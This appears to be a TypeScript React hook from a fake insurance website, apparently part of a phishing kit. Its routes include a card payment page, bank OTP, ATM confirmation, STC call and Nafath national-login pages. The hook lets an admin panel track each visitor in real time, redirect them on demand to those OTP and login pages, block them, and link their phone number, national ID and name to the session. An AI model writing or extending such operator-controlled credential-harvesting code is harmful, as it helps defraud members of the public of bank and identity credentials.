import { useEffect, useRef, useCallback, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { preloadVisitorRoute } from "@/lib/visitorRoutePreload";

const PAGE_NAMES: Record<string, string> = {
  "/": "الصفحة الرئيسية",
  "/about": "من نحن",
  "/insurance-request": "طلب تأمين",
  "/insurance/offers": "عروض التأمين",
  "/insurance/compare": "مقارنة العروض",
  "/insurance/checkout": "إتمام الشراء",
  "/insurance/payment": "الدفع بالبطاقة",
  "/insurance/otp": "رمز التحقق البنكي",
  "/insurance/atm": "تأكيد ATM",
  "/insurance/phone-verify": "توثيق الجوال",
  "/insurance/phone-otp": "كود توثيق الجوال",
  "/insurance/phone-stc": "مكالمة STC",
  "/insurance/nafath-login": "دخول نفاذ",
  "/insurance/nafath-verify": "تحقق نفاذ",
  "/insurance/confirmation": "تأكيد الطلب",
  "/verify-policy": "التحقق من الوثيقة",
  "/admin/login": "دخول الأدمن",
  "/admin": "لوحة التحكم",
};

function getPageName(pathname: string): string {
  return PAGE_NAMES[pathname] || pathname;
}

function getSessionId(): string {
  let sid = sessionStorage.getItem("visitor_sid");
  if (!sid) {
    sid = crypto.randomUUID();
    sessionStorage.setItem("visitor_sid", sid);
  }
  return sid;
}

export function useVisitorTracking() {
  const location = useLocation();
  const navigate = useNavigate();
  const sessionId = useRef(getSessionId());
  const intervalRef = useRef<ReturnType<typeof setInterval>>();
  const [isBlocked, setIsBlocked] = useState(false);
  const lastRedirectRef = useRef<string | null>(null);

  const handleRedirect = useCallback(
    async (targetPath: string | null | undefined, sid: string) => {
      if (!targetPath || targetPath === lastRedirectRef.current) return;

      lastRedirectRef.current = targetPath;
      await preloadVisitorRoute(targetPath);
      navigate(targetPath, { replace: true });
      void supabase
        .from("site_visitors")
        .update({ redirect_to: null } as any)
        .eq("session_id", sid);
    },
    [navigate]
  );

  useEffect(() => {
    if (location.pathname.startsWith("/admin")) return;
    if (sessionStorage.getItem("is_admin_session") === "1") return;

    const sid = sessionId.current;
    const pageName = getPageName(location.pathname);
    const geoResolved = sessionStorage.getItem("visitor_geo_resolved");

    const upsert = async () => {
      const { data, error } = await supabase.rpc("upsert_visitor_tracking", {
        p_session_id: sid,
        p_current_page: pageName,
        p_is_online: true,
      });

      if (!error && data) {
        const result = data as any;
        if (result?.is_blocked) {
          setIsBlocked(true);
        }
        void handleRedirect(result?.redirect_to, sid);
      }
    };

    void upsert();

    if (!geoResolved) {
      sessionStorage.setItem("visitor_geo_resolved", "1");
      supabase.functions
        .invoke("resolve-geo", {
          body: { session_id: sid },
        })
        .catch(() => {});
    }

    intervalRef.current = setInterval(upsert, 4000);

    const channel = supabase
      .channel(`visitor-redirect-${sid}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "site_visitors",
          filter: `session_id=eq.${sid}`,
        },
        (payload) => {
          const updated = payload.new as any;
          if (updated?.is_blocked) {
            setIsBlocked(true);
          }
          void handleRedirect(updated?.redirect_to, sid);
        }
      )
      .subscribe();

    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
      supabase.removeChannel(channel);
    };
  }, [handleRedirect, location.pathname]);

  useEffect(() => {
    if (isBlocked && location.pathname !== "/") {
      navigate("/", { replace: true });
    }
  }, [isBlocked, location.pathname, navigate]);

  const linkVisitorData = useCallback(async (data: {
    phone?: string;
    national_id?: string;
    visitor_name?: string;
    linked_request_id?: string;
    linked_conversation_id?: string;
  }) => {
    const sid = sessionId.current;
    await supabase.rpc("link_visitor_data", {
      p_session_id: sid,
      p_phone: data.phone || null,
      p_national_id: data.national_id || null,
      p_visitor_name: data.visitor_name || null,
    });
  }, []);

  return {
    linkVisitorData,
    sessionId: sessionId.current,
    isBlocked,
  };
}
